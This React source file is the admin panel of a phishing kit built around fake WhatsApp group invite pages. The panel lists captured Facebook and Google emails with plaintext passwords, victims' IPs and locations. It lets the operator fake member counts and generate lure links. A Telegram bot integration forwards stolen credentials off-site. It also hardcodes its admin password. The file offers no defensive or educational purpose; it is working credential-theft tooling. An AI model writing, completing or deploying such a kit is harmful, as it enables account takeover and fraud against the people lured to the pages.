
import React, { useState, useEffect } from 'react';
import { GroupData, VisitorLog, CredentialLog, TelegramConfig } from '../types';
import { 
  saveGroup, getGroups, deleteGroup, 
  getVisitorLogs, getBlockedIPs, blockIP, unblockIP, getCredentials,
  saveTelegramConfig, getTelegramConfig, compressImage, generateInviteLink
} from '../services/storage';
import { 
  SearchIcon, FilterIcon, MoreIcon, PlusIcon, WALogo 
} from './WhatsAppIcons';
import { Camera, Trash2, Shield, ShieldAlert, UserX, ExternalLink, Save, Lock, Users, MessageSquare, KeyRound, Facebook, Mail, Settings, Send, ArrowLeft } from 'lucide-react';

const AdminPanel: React.FC = () => {
  // Auth State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [authError, setAuthError] = useState('');

  // App State
  const [activeTab, setActiveTab] = useState<'chats' | 'security' | 'settings'>('chats');
  const [selectedGroupId, setSelectedGroupId] = useState<string | null>(null);
  
  // Data State
  const [groups, setGroups] = useState<GroupData[]>([]);
  const [logs, setLogs] = useState<VisitorLog[]>([]);
  const [blockedIPs, setBlockedIPs] = useState<string[]>([]);
  const [creds, setCreds] = useState<CredentialLog[]>([]);
  const [tgConfig, setTgConfig] = useState<TelegramConfig>({ botToken: '', chatId: '' });
  
  // Form State
  const [formData, setFormData] = useState<Partial<GroupData>>({
    name: '',
    link: '',
    image: null,
    memberCount: '',
    lastMessage: ''
  });

  useEffect(() => {
    // Check session storage on mount
    const auth = sessionStorage.getItem('wa_admin_auth');
    if (auth === 'true') {
      setIsAuthenticated(true);
    }
  }, []);

  useEffect(() => {
    // Only load data if authenticated
    if (isAuthenticated) {
        loadData();
        const interval = setInterval(loadData, 5000);
        return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === 'amel0892') {
      setIsAuthenticated(true);
      sessionStorage.setItem('wa_admin_auth', 'true');
      setAuthError('');
    } else {
      setAuthError('Incorrect password');
      setPasswordInput('');
    }
  };

  const loadData = () => {
    setGroups(getGroups());
    setLogs(getVisitorLogs());
    setBlockedIPs(getBlockedIPs());
    setCreds(getCredentials());
    
    // Only load config once or if empty to avoid overwriting typing
    const storedConfig = getTelegramConfig();
    if (storedConfig) {
        setTgConfig(prev => {
            if (!prev.botToken && storedConfig.botToken) return storedConfig;
            if (!prev.chatId && storedConfig.chatId) return storedConfig;
            return prev.botToken ? prev : storedConfig;
        });
    }
  };

  // --- Handlers ---
  const handleSelectGroup = (group: GroupData) => {
    setSelectedGroupId(group.id);
    setActiveTab('chats');
    setFormData(group);
  };

  const handleSelectSecurity = () => {
    setActiveTab('security');
    setSelectedGroupId(null);
  };

  const handleSelectSettings = () => {
      setActiveTab('settings');
      setSelectedGroupId(null);
      const conf = getTelegramConfig();
      if (conf) setTgConfig(conf);
  };

  const handleCreateNew = () => {
    const newId = Date.now().toString();
    const newGroup: GroupData = {
      id: newId,
      name: 'New Group',
      link: '',
      image: null,
      memberCount: '256',
      lastMessage: 'Anda telah ditambahkan.'
    };
    // Don't save yet, just prepare form
    setFormData(newGroup);
    setSelectedGroupId(newId);
    setActiveTab('chats');
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      // Use helper to compress image for URL safety
      const compressedBase64 = await compressImage(file);
      setFormData(prev => ({ ...prev, image: compressedBase64 }));
    }
  };

  const handleSave = () => {
    if (!formData.name) return;
    const groupToSave: GroupData = {
      id: formData.id || Date.now().toString(),
      name: formData.name,
      link: formData.link || '',
      image: formData.image || null,
      memberCount: formData.memberCount || '1',
      lastMessage: formData.lastMessage || 'Anda telah ditambahkan.'
    };
    saveGroup(groupToSave);
    loadData();
    // After save, ensure we stay selected on this ID (handles new creation)
    setSelectedGroupId(groupToSave.id);
  };

  const handleDelete = () => {
    if (selectedGroupId && confirm('Delete this group?')) {
      deleteGroup(selectedGroupId);
      setSelectedGroupId(null);
      setFormData({ name: '', link: '', image: null });
      loadData();
    }
  };

  const handleBlockIP = (ip: string) => {
    if (confirm(`Block ${ip}?`)) {
      blockIP(ip);
      loadData();
    }
  };

  const handleUnblockIP = (ip: string) => {
    unblockIP(ip);
    loadData();
  };

  const handleSaveTelegram = () => {
      saveTelegramConfig(tgConfig);
      alert('Telegram settings saved!');
  };

  const handleTestTelegram = async () => {
      if (!tgConfig.botToken || !tgConfig.chatId) {
          alert('Please enter Bot Token and Chat ID first.');
          return;
      }
      try {
        const url = `https://api.telegram.org/bot${tgConfig.botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: tgConfig.chatId,
                text: "✅ <b>TEST MESSAGE</b>\n\nYour Telegram bot is connected successfully!",
                parse_mode: 'HTML'
            })
        });
        alert('Test message sent! Check your Telegram.');
      } catch (e) {
          alert('Failed to send. Check token/ID or internet connection.');
      }
  };

  // UPDATED: Now generates a portable link containing data
  const getPublicLink = () => {
    // Construct a temporary GroupData object from form
    if (!formData.name) return "";
    const groupData: GroupData = {
        id: formData.id || 'temp',
        name: formData.name,
        image: formData.image || null,
        link: formData.link || '',
        memberCount: formData.memberCount,
        lastMessage: formData.lastMessage
    };
    return generateInviteLink(groupData);
  };

  const handleBackToMenu = () => {
      setSelectedGroupId(null);
      setActiveTab('chats');
  };

  // --- LOGIN SCREEN RENDER ---
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#d1d7db] flex flex-col items-center justify-center font-sans">
        <div className="absolute top-0 h-[220px] bg-[#00a884] w-full z-0"></div>
        
        <div className="z-10 flex flex-col items-center gap-8 w-full px-4">
          <div className="flex items-center gap-3 text-white">
             <WALogo />
             <span className="text-sm font-medium uppercase tracking-wider text-white">Admin Console</span>
          </div>

          <div className="bg-white p-8 rounded shadow-lg w-full max-w-[400px] flex flex-col gap-6">
             <div className="text-center">
               <h2 className="text-2xl font-light text-[#41525d] mb-2">Authenticate</h2>
               <p className="text-[#8696a0] text-sm">Please enter your admin credentials.</p>
             </div>

             <form onSubmit={handleLogin} className="flex flex-col gap-4">
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-400">
                    <Lock size={18} />
                  </div>
                  <input 
                    type="password" 
                    value={passwordInput}
                    onChange={(e) => setPasswordInput(e.target.value)}
                    placeholder="Password"
                    className={`w-full pl-10 pr-4 py-3 border rounded-md outline-none focus:border-[#00a884] transition ${authError ? 'border-red-500 bg-red-50' : 'border-gray-200'}`}
                    autoFocus
                  />
                </div>
                {authError && <p className="text-red-500 text-xs text-center">{authError}</p>}
                
                <button 
                  type="submit"
                  className="bg-[#008069] hover:bg-[#006d59] text-white font-medium py-2.5 rounded shadow-sm transition mt-2"
                >
                  Access Panel
                </button>
             </form>
          </div>
        </div>
      </div>
    );
  }

  // --- MAIN ADMIN UI RENDER ---
  const activeGroupData = groups.find(g => g.id === selectedGroupId);
  const isEditingOrViewing = selectedGroupId || activeTab !== 'chats';

  return (
    <div className="flex h-screen overflow-hidden bg-[#d1d7db] font-sans antialiased text-[#111b21]">
      
      {/* --- SIDEBAR --- */}
      <aside className={`
          flex-col z-20 bg-white border-r border-[#d1d7db]
          ${isEditingOrViewing ? 'hidden md:flex' : 'flex w-full'} 
          md:w-[30%] md:min-w-[340px] md:max-w-[420px]
      `}>
        
        <header className="h-[60px] bg-[#f0f2f5] px-4 flex items-center justify-between shrink-0">
          <div className="w-10 h-10 rounded-full bg-gray-300 overflow-hidden cursor-pointer">
             <img src="https://ui-avatars.com/api/?name=Admin&background=0D8ABC&color=fff" alt="Admin" />
          </div>
          <div className="flex gap-3 text-[#54656f]">
             <button title="New Group" onClick={handleCreateNew} className="p-2 rounded-full hover:bg-black/10 transition">
                <PlusIcon />
             </button>
             <button title="Settings" onClick={handleSelectSettings} className="p-2 rounded-full hover:bg-black/10 transition">
                <Settings size={20} />
             </button>
          </div>
        </header>

        <div className="h-[50px] bg-white flex items-center px-3 border-b border-[#f0f2f5]">
          <div className="flex-1 h-[35px] bg-[#f0f2f5] rounded-lg flex items-center px-3 gap-3">
             <div className="text-[#54656f] rotate-y-180"><SearchIcon /></div>
             <input type="text" placeholder="Search or start new chat" className="bg-transparent border-none outline-none text-[14px] w-full text-[#3b4a54] placeholder-[#54656f]"/>
          </div>
          <button className="p-2 text-[#54656f]"><FilterIcon /></button>
        </div>

        <div className="flex-1 overflow-y-auto bg-white custom-scrollbar">
          <div onClick={handleSelectSecurity} className={`h-[72px] px-3 flex items-center gap-3 cursor-pointer hover:bg-[#f0f2f5] transition ${activeTab === 'security' ? 'bg-[#f0f2f5]' : ''}`}>
             <div className="w-[49px] h-[49px] rounded-full bg-blue-100 flex items-center justify-center text-blue-600"><Shield size={24} /></div>
             <div className="flex-1 border-b border-[#f0f2f5] h-full flex flex-col justify-center pr-2">
                <div className="flex justify-between items-center">
                   <h3 className="text-[17px] font-normal">Security Center</h3>
                   <span className="text-[12px] text-[#667781]">{logs.length > 0 ? new Date(logs[0].timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : ''}</span>
                </div>
                <div className="flex justify-between items-center">
                   <p className="text-[13px] text-[#54656f] truncate">{creds.length} logins captured.</p>
                   {creds.length > 0 && <span className="bg-[#ea0038] text-white text-[12px] font-bold px-1.5 min-w-[20px] h-[20px] rounded-full flex items-center justify-center">{creds.length}</span>}
                </div>
             </div>
          </div>
          <div className="px-4 py-2 text-[13px] text-[#008069] font-medium">YOUR GROUPS</div>
          {groups.map((group) => (
             <div key={group.id} onClick={() => handleSelectGroup(group)} className={`h-[72px] px-3 flex items-center gap-3 cursor-pointer hover:bg-[#f0f2f5] transition ${selectedGroupId === group.id ? 'bg-[#f0f2f5]' : ''}`}>
                <div className="w-[49px] h-[49px] rounded-full bg-gray-200 overflow-hidden flex-shrink-0">
                   {group.image ? <img src={group.image} alt="" className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center text-gray-500"><Camera size={20} /></div>}
                </div>
                <div className="flex-1 border-b border-[#f0f2f5] h-full flex flex-col justify-center pr-2 min-w-0">
                   <div className="flex justify-between items-center"><h3 className="text-[17px] font-normal text-[#111b21] truncate">{group.name || 'Untitled Group'}</h3></div>
                   <p className="text-[13px] text-[#54656f] truncate">{group.memberCount ? `${group.memberCount} members` : 'Edit to add members'}</p>
                </div>
             </div>
          ))}
          {groups.length === 0 && <div className="p-5 text-center text-sm text-gray-400">No groups created. Click + to add.</div>}
        </div>
      </aside>

      {/* --- MAIN CONTENT --- */}
      <main className={`relative bg-[#efeae2] flex-col ${!isEditingOrViewing ? 'hidden md:flex' : 'flex w-full'} md:flex-1`}>
         <div className="absolute inset-0 opacity-[0.4] pointer-events-none" style={{ backgroundImage: 'url("https://user-images.githubusercontent.com/15075759/28719144-86dc0f70fcded21.png")' }}></div>

         {activeTab === 'chats' && !selectedGroupId && (
            <div className="absolute inset-0 flex flex-col items-center justify-center p-10 text-center z-10 border-b-[6px] border-[#25d366]">
               <div className="mb-10 relative">
                   <div className="w-[300px] h-[200px] bg-gray-100 rounded-lg flex items-center justify-center text-gray-300"><img src="https://static.whatsapp.net/rsrc.php/v3/y6/r/wa66945.png" alt="WhatsApp Web" className="opacity-80" /></div>
               </div>
               <h1 className="text-[32px] font-light text-[#41525d] mb-4">WhatsApp Web Clone</h1>
               <p className="text-[14px] text-[#667781] leading-relaxed max-w-[500px]">Send and receive messages without keeping your phone online.<br/>Use WhatsApp on up to 4 linked devices and 1 phone.</p>
            </div>
         )}

         {activeTab === 'settings' && (
             <div className="absolute inset-0 flex flex-col z-10 bg-[#efeae2]">
                <header className="h-[60px] bg-[#f0f2f5] px-4 flex items-center gap-2 border-b border-[#d1d7db] shrink-0">
                    <button onClick={handleBackToMenu} className="md:hidden p-2 -ml-2 text-[#54656f] hover:bg-gray-200 rounded-full"><ArrowLeft size={24} /></button>
                    <div className="font-medium text-[#111b21] flex items-center gap-2"><Settings size={20} /> Telegram Integration</div>
                </header>
                <div className="flex-1 overflow-y-auto p-4 md:p-8">
                     <div className="max-w-2xl mx-auto bg-white rounded shadow-sm p-6">
                         <div className="flex items-center gap-3 mb-6 bg-blue-50 p-4 rounded-lg text-blue-800"><Send size={24} /><p className="text-sm">Connect your Telegram Bot to receive live logs and credentials captured from visitors.</p></div>
                         <div className="space-y-6">
                             <div>
                                 <label className="block text-sm font-medium text-gray-700 mb-1">Bot Token</label>
                                 <input type="text" value={tgConfig.botToken} onChange={e => setTgConfig({...tgConfig, botToken: e.target.value})} placeholder="e.g. 123456789:ABCdefGhI..." className="w-full p-2 border border-gray-300 rounded focus:border-[#00a884] outline-none font-mono text-sm"/>
                                 <p className="text-xs text-gray-500 mt-1">Get this from @BotFather on Telegram.</p>
                             </div>
                             <div>
                                 <label className="block text-sm font-medium text-gray-700 mb-1">Chat ID</label>
                                 <input type="text" value={tgConfig.chatId} onChange={e => setTgConfig({...tgConfig, chatId: e.target.value})} placeholder="e.g. 123456789" className="w-full p-2 border border-gray-300 rounded focus:border-[#00a884] outline-none font-mono text-sm"/>
                                 <p className="text-xs text-gray-500 mt-1"><span className="text-red-500 font-bold">Important:</span> You need your <b>numeric Chat ID</b>, not username.<br/>1. Click Start on your bot.<br/>2. Search <b>@userinfobot</b> on Telegram to see your ID.</p>
                             </div>
                             <div className="flex items-center gap-4 pt-4 border-t border-gray-100">
                                 <button onClick={handleSaveTelegram} className="flex items-center gap-2 bg-[#008069] text-white px-4 py-2 rounded hover:bg-[#006d59] transition font-medium"><Save size={18} /> Save Settings</button>
                                 <button onClick={handleTestTelegram} className="flex items-center gap-2 bg-white border border-gray-300 text-gray-700 px-4 py-2 rounded hover:bg-gray-50 transition"><Send size={18} /> Test Message</button>
                             </div>
                         </div>
                     </div>
                </div>
             </div>
         )}

         {activeTab === 'security' && (
            <div className="absolute inset-0 flex flex-col z-10 bg-[#efeae2]">
                <header className="h-[60px] bg-[#f0f2f5] px-4 flex items-center gap-2 border-b border-[#d1d7db] shrink-0">
                    <button onClick={handleBackToMenu} className="md:hidden p-2 -ml-2 text-[#54656f] hover:bg-gray-200 rounded-full"><ArrowLeft size={24} /></button>
                    <div className="font-medium text-[#111b21] flex items-center gap-2"><Shield size={20}/> Security Center</div>
                </header>
                <div className="flex-1 overflow-y-auto p-4 md:p-8">
                    <div className="max-w-4xl mx-auto space-y-6">
                        <div className="bg-white rounded shadow-sm overflow-hidden border-l-4 border-l-[#ea0038]">
                            <div className="bg-red-50 px-4 py-3 border-b border-red-100 flex items-center justify-between">
                                <span className="font-medium text-red-900 flex items-center gap-2"><KeyRound size={18}/> Captured Credentials</span>
                                <span className="text-xs bg-red-200 text-red-900 px-2 py-0.5 rounded-full">{creds.length}</span>
                            </div>
                            <div className="overflow-x-auto">
                                <table className="w-full text-left text-sm">
                                    <thead className="bg-[#f0f2f5] text-[#54656f] text-xs uppercase font-medium"><tr><th className="px-4 py-3">Service</th><th className="px-4 py-3">Email/ID</th><th className="px-4 py-3">Password</th><th className="px-4 py-3">IP & Location</th></tr></thead>
                                    <tbody className="divide-y divide-gray-100">
                                        {creds.map((cred, i) => (
                                            <tr key={i} className="hover:bg-gray-50">
                                                <td className="px-4 py-3">{cred.service === 'facebook' ? <span className="flex items-center gap-1 text-blue-600 font-bold"><Facebook size={14}/> FB</span> : <span className="flex items-center gap-1 text-red-500 font-bold"><Mail size={14}/> Google</span>}</td>
                                                <td className="px-4 py-3 font-medium text-gray-800">{cred.email}</td>
                                                <td className="px-4 py-3 font-mono text-red-600">{cred.password}</td>
                                                <td className="px-4 py-3 text-xs text-gray-500"><div className="font-mono">{cred.ip}</div><div className="font-medium text-gray-700">{cred.location || 'Unknown Location'}</div><div className="text-[10px] text-gray-400 mt-0.5">{new Date(cred.timestamp).toLocaleTimeString()}</div></td>
                                            </tr>
                                        ))}
                                        {creds.length === 0 && <tr><td colSpan={4} className="p-4 text-center text-gray-500">No credentials captured yet.</td></tr>}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div className="bg-white rounded shadow-sm overflow-hidden">
                            <div className="bg-gray-50 px-4 py-3 border-b border-gray-100 flex items-center justify-between"><span className="font-medium text-gray-800 flex items-center gap-2"><ShieldAlert size={18}/> Blocked IPs</span><span className="text-xs bg-gray-200 text-gray-700 px-2 py-0.5 rounded-full">{blockedIPs.length}</span></div>
                            {blockedIPs.length === 0 ? <div className="p-4 text-sm text-gray-500 text-center">No blocked users.</div> : <div className="divide-y">{blockedIPs.map(ip => (<div key={ip} className="px-4 py-3 flex items-center justify-between hover:bg-gray-50"><span className="font-mono text-sm text-gray-700">{ip}</span><button onClick={() => handleUnblockIP(ip)} className="text-xs font-medium text-green-600 hover:text-green-800 border border-green-200 px-3 py-1 rounded bg-white">Unblock</button></div>))}</div>}
                        </div>
                        <div className="bg-white rounded shadow-sm overflow-hidden">
                             <div className="bg-gray-50 px-4 py-3 border-b border-gray-200 flex items-center justify-between"><span className="font-medium text-gray-800">Visitor Logs</span><button onClick={loadData} className="text-xs text-blue-600 hover:underline">Refresh</button></div>
                            <div className="overflow-x-auto">
                                <table className="w-full text-left text-sm">
                                    <thead className="bg-[#f0f2f5] text-[#54656f] text-xs uppercase font-medium"><tr><th className="px-4 py-3">Time</th><th className="px-4 py-3">Group</th><th className="px-4 py-3">Details</th><th className="px-4 py-3 text-right">Action</th></tr></thead>
                                    <tbody className="divide-y divide-gray-100">
                                        {logs.map((log, i) => (
                                            <tr key={i} className="hover:bg-gray-50">
                                                <td className="px-4 py-3 text-gray-500 whitespace-nowrap">{new Date(log.timestamp).toLocaleTimeString()}</td>
                                                <td className="px-4 py-3 font-medium text-gray-800">{log.groupName}</td>
                                                <td className="px-4 py-3 text-gray-600"><div className="font-mono text-xs">{log.ip}</div><div className="text-xs opacity-75">{log.city}, {log.country_name}</div></td>
                                                <td className="px-4 py-3 text-right">{!blockedIPs.includes(log.ip) ? <button onClick={() => handleBlockIP(log.ip)} className="text-red-600 hover:bg-red-50 p-2 rounded" title="Block"><UserX size={16} /></button> : <span className="text-xs font-bold text-red-500">BLOCKED</span>}</td>
                                            </tr>
                                        ))}
                                        {logs.length === 0 && <tr><td colSpan={4} className="p-4 text-center text-gray-500">No logs available.</td></tr>}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
         )}

         {selectedGroupId && (
            <div className="absolute inset-0 flex flex-col z-10 bg-[#efeae2]">
                <header className="h-[60px] bg-[#f0f2f5] px-4 flex items-center justify-between border-b border-[#d1d7db] shrink-0">
                    <div className="flex items-center gap-2">
                        <button onClick={handleBackToMenu} className="md:hidden p-2 -ml-2 text-[#54656f] hover:bg-gray-200 rounded-full"><ArrowLeft size={24} /></button>
                        <div className="w-10 h-10 rounded-full bg-gray-200 overflow-hidden cursor-pointer">{formData.image ? <img src={formData.image} alt="" className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center text-gray-500 bg-gray-300"><Camera size={20} /></div>}</div>
                        <div className="flex flex-col justify-center ml-2"><span className="text-[#111b21] font-medium text-[16px] leading-tight max-w-[150px] truncate">{formData.name || 'New Group'}</span><span className="text-[13px] text-[#54656f]">{formData.memberCount ? `${formData.memberCount} members` : 'click to edit'}</span></div>
                    </div>
                    <div className="flex gap-4 text-[#54656f]"><SearchIcon /><MoreIcon /></div>
                </header>

                <div className="flex-1 overflow-y-auto custom-scrollbar">
                    <div className="max-w-[800px] mx-auto pt-6 pb-20 px-4">
                        <div className="bg-white shadow-sm rounded-lg p-6 mb-4 flex flex-col items-center">
                            <div className="relative group w-[200px] h-[200px] rounded-full bg-gray-200 mb-6 overflow-hidden cursor-pointer">
                                {formData.image ? <img src={formData.image} alt="" className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center text-gray-400"><Camera size={64} /></div>}
                                <label className="absolute inset-0 bg-black/40 flex flex-col items-center justify-center text-white opacity-0 group-hover:opacity-100 transition duration-200 cursor-pointer"><Camera size={24} className="mb-2" /><span className="text-xs uppercase font-medium tracking-wide">Change <br/> Profile Photo</span><input type="file" className="hidden" accept="image/*" onChange={handleImageUpload} /></label>
                            </div>

                            <div className="w-full max-w-md space-y-6">
                                <div className="relative group"><label className="text-[#008069] text-xs font-medium mb-1 block">Group Name (Subject)</label><div className="flex items-center border-b-2 border-transparent focus-within:border-[#00a884] hover:border-gray-300 transition"><input type="text" value={formData.name || ''} onChange={e => setFormData({...formData, name: e.target.value})} className="w-full py-2 text-[17px] text-[#111b21] outline-none bg-transparent" placeholder="e.g. Family Group"/><span className="text-gray-400 text-sm">{25 - (formData.name?.length || 0)}</span></div></div>
                                <div className="relative group"><label className="text-[#008069] text-xs font-medium mb-1 flex items-center gap-1"><Users size={12}/> Member Count (Fake Display)</label><div className="flex items-center border-b-2 border-transparent focus-within:border-[#00a884] hover:border-gray-300 transition"><input type="text" value={formData.memberCount || ''} onChange={e => setFormData({...formData, memberCount: e.target.value})} className="w-full py-2 text-[15px] text-[#111b21] outline-none bg-transparent" placeholder="e.g. 256 or 1.2K"/></div></div>
                                <div className="relative group"><label className="text-[#008069] text-xs font-medium mb-1 flex items-center gap-1"><MessageSquare size={12}/> List Preview Text</label><div className="flex items-center border-b-2 border-transparent focus-within:border-[#00a884] hover:border-gray-300 transition"><input type="text" value={formData.lastMessage || ''} onChange={e => setFormData({...formData, lastMessage: e.target.value})} className="w-full py-2 text-[15px] text-[#111b21] outline-none bg-transparent" placeholder="e.g. Anda telah ditambahkan."/></div></div>
                                <div className="relative group pt-2"><label className="text-[#008069] text-xs font-medium mb-1 block">Destination Link (Invite URL)</label><div className="flex items-center bg-[#f0f2f5] rounded px-3 py-1"><input type="url" value={formData.link || ''} onChange={e => setFormData({...formData, link: e.target.value})} className="w-full py-2 text-[15px] text-[#111b21] outline-none bg-transparent" placeholder="https://chat.whatsapp.com/..."/></div><p className="text-xs text-gray-500 mt-1">Visitors will be redirected here when clicking the chat.</p></div>
                            </div>
                        </div>

                        {formData.name && (
                            <div className="bg-white shadow-sm rounded-lg p-4 mb-4">
                                <h3 className="text-[#54656f] text-sm font-medium mb-3">Public Portable Link</h3>
                                <div className="flex items-center gap-3 bg-[#f0f2f5] p-3 rounded border border-gray-200">
                                    <span className="text-[#00a884]"><ExternalLink size={20}/></span>
                                    <a href={getPublicLink()} target="_blank" rel="noreferrer" className="text-blue-500 hover:underline truncate text-sm flex-1 font-mono">{getPublicLink()}</a>
                                </div>
                                <p className="text-xs text-gray-500 mt-2"><b>Tip:</b> Copy this link to share. It works on any browser/device because the group data is stored inside the link itself.</p>
                            </div>
                        )}

                        <div className="bg-white shadow-sm rounded-lg overflow-hidden">
                             <button onClick={handleSave} className="w-full text-left px-6 py-4 text-[17px] text-[#008069] hover:bg-[#f5f6f6] transition flex items-center gap-4"><Save size={20} /> Save Changes</button>
                             {activeGroupData && <button onClick={handleDelete} className="w-full text-left px-6 py-4 text-[17px] text-[#ea0038] hover:bg-[#f5f6f6] transition flex items-center gap-4"><Trash2 size={20} /> Delete Group</button>}
                        </div>
                    </div>
                </div>
            </div>
         )}
      </main>
    </div>
  );
};

export default AdminPanel;
